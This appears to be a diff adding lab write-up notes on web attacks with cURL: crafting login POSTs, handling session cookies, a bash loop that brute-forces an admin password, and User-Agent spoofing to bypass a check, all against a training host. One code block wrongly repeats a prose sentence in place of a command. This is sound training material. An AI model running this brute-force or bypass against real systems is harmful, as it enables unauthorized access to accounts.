@@ -1321,3 +1321,77 @@ Hmmm, let's copy the file in this directory to our local machine. This might hav
 ```
 aws s3api get-object --bucket easter-secrets-123145 --key cloud_password.txt cloud_password.txt
 ```
+
+24 Exploitation with cURL - Hopperation Eggsploit
+==================================================
+- command line and cURL to speak HTTP directly: send requests, read responses, and find the endpoints that shut the portal
+
+Web Hacking Using cURL
+----------------------
+- curl is a command-line tool for crafting HTTP requests and viewing raw responses. It's ideal when you need precision or when GUI tools aren't available.
+```
+curl http://10.66.143.96/   # sends an HTTP GET request for the site's home page
+```
+```
+curl -X POST -d "username=user&password=user" http://10.66.143.96/post.php
+```
+- -X POST tells cURL to use the POST method.
+- -d defines the data we're sending in the body of the request.
+- The data will be sent in URL-encoded format, which is the same as what HTML forms use.
+
+- if the Login button is included:
+```
+curl -X POST -d "username=user&password=user&submit=Login" http://10.66.143.96/post.php
+```
+To view exactly what the server returns (including headers and potential redirects), add the -i flag:
+```
+To view exactly what the server returns (including headers and potential redirects), add the -i flag:
+```
+If the site responds with a Set-Cookie header, that's a good sign, it means you've successfully logged in or at least triggered a session.
+
+Using Cookies and Sessions
+--------------------------
+Once you log in, web applications use cookies to keep your session active. When you make another request with your browser, the cookie gets sent automatically, but with cURL, you need to handle it yourself.
+1. Save the cookies
+  ```
+  curl -c cookies.txt -d "username=admin&password=admin" http://10.66.143.96/session.php
+  ```
+  - The -c option writes any cookies received from the server into a file (cookies.txt in this case).
+  - You'll often see a session cookie like PHPSESSID=xyz123.
+2. Reuse the saved cookies
+  ```
+  curl -b cookies.txt http://10.66.143.96/session.php
+  ```
+  - The -b option tells cURL to send the saved cookies in the next request, just like a browser would.
+
+Exercise
+----------
+loop.sh:
+```
+for pass in $(cat passwords.txt); do
+  echo "Trying password: $pass"
+  response=$(curl -s -X POST -d "username=admin&password=$pass" http://10.66.143.96/bruteforce.php)
+  if echo "$response" | grep -q "Welcome"; then
+    echo "[+] Password found: $pass"
+    break
+  fi
+done
+```
+
+```
+root@attackbox:~# chmod +x loop.sh
+root@attackbox:~# ./loop.sh
+```
+
+This exact method underpins tools like Hydra, Burp Intruder, and WFuzz. By doing it manually, you understand what's happening under the hood: a repetitive HTTP POST with variable data, waiting for a different response.
+
+Bypassing User-Agent Checks
+----------------------------
+Some applications block cURL by checking the User-Agent header. For example, the server may reject requests with: User-Agent: curl/7.x.x
+```
+root@attackbox:~# curl -i http://10.66.143.96/ua_check.php
+root@attackbox:~# curl -i -A "internalcomputer" http://10.66.143.96/ua_check.php
+```
+If the first fails and the second succeeds, the UA check is working, and you've bypassed it by spoofing.
+
+
